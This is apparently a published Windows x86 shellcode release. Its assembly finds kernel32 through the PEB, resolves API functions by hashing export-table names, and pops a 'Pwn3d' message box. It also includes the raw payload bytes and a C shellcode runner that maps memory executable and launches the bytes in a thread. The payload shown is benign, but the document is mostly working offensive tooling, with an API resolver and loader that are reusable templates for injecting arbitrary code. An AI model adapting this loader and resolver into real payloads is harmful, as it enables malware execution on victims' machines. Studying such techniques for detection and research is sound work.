; Name: Windows/x86 - MessageBoxA PEB & Export Address Table NullFree/Dynamic Shellcode (230 bytes)
; Author: h4pp1n3ss
; Date: Wed 09/23/2021
; Tested on: Microsoft Windows [Version 10.0.19042.1237]

; Description:
; This is a shellcode that
; pop a MessageBox and show the text "Pwn3d by h4pp1n3ss". In order to accomplish this task the shellcode uses
; the PEB method to locate the baseAddress of the required module and the Export Directory Table
; to locate symbols. Also the shellcode uses a hash function to gather dynamically the required
; symbols without worry about the length.



start:
    mov   ebp, esp                   ;
    add   esp, 0xfffff9f0            ;   Avoid NULL bytes

find_kernel32:
    xor   ecx, ecx                   ;   ECX = 0
    mov   esi,fs:[ecx+0x30]          ;   ESI = &(PEB) ([FS:0x30])
    mov   esi,[esi+0x0C]             ;   ESI = PEB->Ldr
    mov   esi,[esi+0x1C]             ;   ESI = PEB->Ldr.InInitOrder

next_module:
    mov   ebx, [esi+0x08]            ;   EBX = InInitOrder[X].base_address
    mov   edi, [esi+0x20]            ;   EDI = InInitOrder[X].module_name
    mov   esi, [esi]                 ;   ESI = InInitOrder[X].flink (next)
    cmp   [edi+12*2], cx             ;   (unicode) modulename[12] == 0x00 ?
    jne   next_module                ;   No: try next module

find_function_shorten:
    jmp find_function_shorten_bnc    ;   Short jump

find_function_ret:
    pop esi                          ;   POP the return address from the stack
    mov   [ebp+0x04], esi            ;   Save find_function address for later usage
    jmp resolve_symbols_kernel32     ;

find_function_shorten_bnc:
    call find_function_ret           ;   Relative CALL with negative offset

find_function:
    pushad                           ;   Save all registers
    mov   eax, [ebx+0x3c]            ;   Offset to PE Signature
    mov   edi, [ebx+eax+0x78]        ;   Export Table Directory RVA
    add   edi, ebx                   ;   Export Table Directory VMA
    mov   ecx, [edi+0x18]            ;   NumberOfNames
    mov   eax, [edi+0x20]            ;   AddressOfNames RVA
    add   eax, ebx                   ;   AddressOfNames VMA
    mov   [ebp-4], eax               ;   Save AddressOfNames VMA for later

find_function_loop:
    jecxz find_function_finished     ;   Jump to the end if ECX is 0
    dec   ecx                        ;   Decrement our names counter
    mov   eax, [ebp-4]               ;   Restore AddressOfNames VMA
    mov   esi, [eax+ecx*4]           ;   Get the RVA of the symbol name
    add   esi, ebx                   ;   Set ESI to the VMA of the current symbol name

compute_hash:
    xor   eax, eax                   ;   NULL EAX
    cdq                              ;   NULL EDX
    cld                              ;   Clear direction

compute_hash_again:
    lodsb                            ;   Load the next byte from esi into al
    test  al, al                     ;   Check for NULL terminator
    jz    compute_hash_finished      ;   If the ZF is set, we've hit the NULL term
    ror   edx, 0x0d                  ;   Rotate edx 13 bits to the right
    add   edx, eax                   ;   Add the new byte to the accumulator
    jmp   compute_hash_again         ;   Next iteration

compute_hash_finished:

find_function_compare:
    cmp   edx, [esp+0x24]            ;   Compare the computed hash with the requested hash
    jnz   find_function_loop         ;   If it doesn't match go back to find_function_loop
    mov   edx, [edi+0x24]            ;   AddressOfNameOrdinals RVA
    add   edx, ebx                   ;   AddressOfNameOrdinals VMA
    mov   cx,  [edx+2*ecx]           ;   Extrapolate the function's ordinal
    mov   edx, [edi+0x1c]            ;   AddressOfFunctions RVA
    add   edx, ebx                   ;   AddressOfFunctions VMA
    mov   eax, [edx+4*ecx]           ;   Get the function RVA
    add   eax, ebx                   ;   Get the function VMA
    mov   [esp+0x1c], eax            ;   Overwrite stack version of eax from pushad

find_function_finished:
    popad                            ;   Restore registers
    ret                              ;

resolve_symbols_kernel32:
    push 0xec0e4e8e                  ;   LoadLibraryA hash
    call dword  [ebp+0x04]           ;   Call find_function
    mov   [ebp+0x10], eax            ;   Save LoadLibraryA address for later usage
    push 0x78b5b983                  ;   TerminateProcess hash
    call dword  [ebp+0x04]           ;   Call find_function
    mov   [ebp+0x14], eax            ;   Save TerminateProcess address for later usage

load_user32_lib:
    xor eax, eax                     ;  EAX = Null
    mov ax, 0x6c6c;
    push eax;                        ; Stack = "ll"
    push dword 0x642e3233;           ; Stack = "32.dll"
    push dword 0x72657355;           ; Stack = "User32.dll"
    push esp                         ; Stack = &("User32.dll")
    call dword  [ebp+0x10]           ; Call LoadLibraryA

resolve_symbols_user32:
    mov   ebx, eax                  ;  Move the base address of user32.dll to EBX
    push 0xbc4da2a8                 ;  MessageBoxA hash
    call dword  [ebp+0x04]          ;  Call find_function
    mov   [ebp+0x18], eax           ;  Save MessageBoxA address for later usage

call_MessageBoxA:
    xor eax, eax                    ; EAX = NULL
    mov ax, 0x7373                  ; "ss"
    push eax                        ; Stack = "ss"
    push dword 0x336e3170           ; Stack = "p1n3ss"
    push dword 0x70346820           ; Stack = " h4pp1n3ss"
    push dword 0x79622064           ; Stack = "d by h4pp1n3ss"
    push dword 0x336e7750           ; Stack = "Pwn3d by h4pp1n3ss"
    push esp                        ; Stack = &("Pwn3d by h4pp1n3ss")
    mov ebx, [esp]                  ; EBX = &(push_inst_greetings)
    xor eax, eax                    ; EAX = NULL
    push eax                        ; uType
    push ebx                        ; lpCaption
    push ebx                        ; lpText
    push eax                        ; hWnd
    call dword  [ebp+0x18]       ; Call MessageBoxA

call_TerminateProcess:
    xor eax, eax                    ;  EAX = null
    push eax                        ;  uExitCode
    push 0xffffffff                 ;  hProcess
    call dword  [ebp+0x14]       ;  Call TerminateProcess


[!]===================================== POC ========================================= [!]

/*

 Shellcode runner author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Our MessageBoxA shellcode
unsigned char payload[] =
"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b"
"\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06"
"\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03"
"\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b"
"\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca"
"\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b"
"\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3"
"\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x10\x68\x83\xb9\xb5\x78\xff\x55"
"\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x55"
"\x73\x65\x72\x54\xff\x55\x10\x89\xc3\x68\xa8\xa2\x4d\xbc\xff\x55\x04\x89"
"\x45\x18\x31\xc0\x66\xb8\x73\x73\x50\x68\x70\x31\x6e\x33\x68\x20\x68\x34"
"\x70\x68\x64\x20\x62\x79\x68\x50\x77\x6e\x33\x54\x8b\x1c\x24\x31\xc0\x50"
"\x53\x53\x50\xff\x55\x18\x31\xc0\x50\x6a\xff\xff\x55\x14";


unsigned int payload_len = 230;

int main(void) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
  printf("Shellcode Length:  %d\n", strlen(payload));
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}